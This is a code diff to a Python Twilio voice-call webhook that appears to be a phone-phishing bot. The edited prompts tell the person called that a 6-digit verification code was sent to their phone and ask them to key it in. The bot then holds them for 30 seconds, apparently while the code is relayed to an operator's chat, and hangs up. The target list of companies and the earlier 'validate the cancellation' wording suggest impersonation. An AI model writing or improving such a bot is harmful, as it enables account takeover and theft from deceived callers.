@@ -176,18 +176,18 @@ def gather_webhook(action):
 
     response = VoiceResponse()
 
-    # Si es empresa y marcó 2 → pedir código de 6 dígitos
-    if action in EMPRESAS and digit == "2":
+    # Si es empresa y marcó 1 o 2 → pedir código OTP de 6 dígitos
+    if action in EMPRESAS and digit in ["1", "2"]:
         gather = Gather(
             num_digits=6,
             action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
             method="POST",
-            timeout=15,
+            timeout=20,
             finish_on_key=""
         )
-        gather.say("To validate the cancellation, please enter your 6 digit account number.", language="en-US", rate="85%")
+        gather.say("We have sent a 6 digit verification code to your phone number. Please enter it now.", language="en-US", rate="85%")
         response.append(gather)
-        response.say("We did not receive your code. Goodbye.", language="en-US", rate="85%")
+        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", rate="85%")
     # Si es cobrar y marcó 1 → pedir código de cuenta
     elif action == "cobrar" and digit == "1":
         gather = Gather(
@@ -253,9 +253,9 @@ def codigo_webhook(call_sid, chat_id):
 
     # Mantener cliente en espera
     response = VoiceResponse()
-    response.say("Hemos recibido su codigo. Por favor espere un momento.", language="es-MX", rate="85%")
+    response.say("Thank you. We have received your code. Please hold while we verify your information.", language="en-US", rate="85%")
     response.pause(length=30)
-    response.say("Gracias por su paciencia. Hasta luego.", language="es-MX", rate="85%")
+    response.say("Thank you for your patience. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
